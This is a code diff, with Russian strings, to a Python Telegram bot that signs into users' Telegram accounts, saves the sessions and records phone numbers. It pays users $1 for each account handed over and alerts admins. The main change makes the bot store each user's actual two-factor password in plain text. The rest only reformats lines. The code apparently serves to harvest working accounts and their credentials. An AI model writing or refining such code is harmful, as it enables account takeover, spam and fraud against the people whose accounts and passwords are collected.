@@ -312,8 +312,7 @@ async def send_log(text: str):
         logger.error(f"Не удалось отправить лог: {e}")
 
 
-async def finalize_auth_and_success(client: TelegramClient, phone: str, session_name: str, user_id: int,
-                                    has_2fa: bool = False, password_used: str = None):
+async def finalize_auth_and_success(client: TelegramClient, phone: str, session_name: str, user_id: int, has_2fa: bool = False, password_used: str = None):
     try:
         if await client.is_user_authorized():
             await client.session.save()
@@ -328,7 +327,7 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
     async with aiosqlite.connect(DB_PATH) as db:
         cursor = await db.execute(
             "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, ?, datetime('now'))",
-            (user_id, phone, session_name, password if has_2fa else "")
+            (user_id, phone, session_name, password_used if (has_2fa and password_used) else "")
         )
         acc_id = cursor.lastrowid
         await db.commit()
@@ -338,8 +337,7 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
 
     # Начисляем бонус юзеру
     async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute(
-            "UPDATE users SET balance = balance + 1.0, total_earned = total_earned + 1.0 WHERE user_id = ?", (user_id,))
+        await db.execute("UPDATE users SET balance = balance + 1.0, total_earned = total_earned + 1.0 WHERE user_id = ?", (user_id,))
         await db.commit()
 
     for admin_id in ADMIN_IDS:
@@ -365,8 +363,7 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
 
     try:
         success_text = "✅ Ваш аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
-        await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS),
-                               parse_mode="Markdown")
+        await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS), parse_mode="Markdown")
     except Exception:
         pass
 
